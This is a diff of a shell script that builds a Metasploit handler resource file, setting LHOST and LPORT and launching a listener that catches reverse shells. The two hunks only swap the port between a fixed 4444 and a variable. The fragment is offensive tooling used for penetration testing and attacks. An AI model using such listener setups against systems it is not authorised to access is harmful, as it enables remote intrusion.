@@ -241,7 +241,7 @@ printf "set LHOST 127.0.0.1\n" >> handler.rc
 else
 printf "set LHOST %s\n" $server_tcp >> handler.rc
 fi
-printf "set LPORT 4444\n" >> handler.rc
+printf "set LPORT %s\n" $server_port >> handler.rc
 #printf "set ExitOnSession false\n" >> handler.rc
 #printf "exploit -j -z\n" >> handler.rc
 printf "exploit\n" >> handler.rc
@@ -273,7 +273,7 @@ else
 printf "set LHOST %s\n" $server_tcp >> handler.rc
 fi
 
-printf "set LPORT %s\n" $server_port >> handler.rc
+printf "set LPORT 4444\n" >> handler.rc
 #printf "set ExitOnSession false\n" >> handler.rc
 #printf "exploit -j -z\n" >> handler.rc
 printf "exploit\n" >> handler.rc
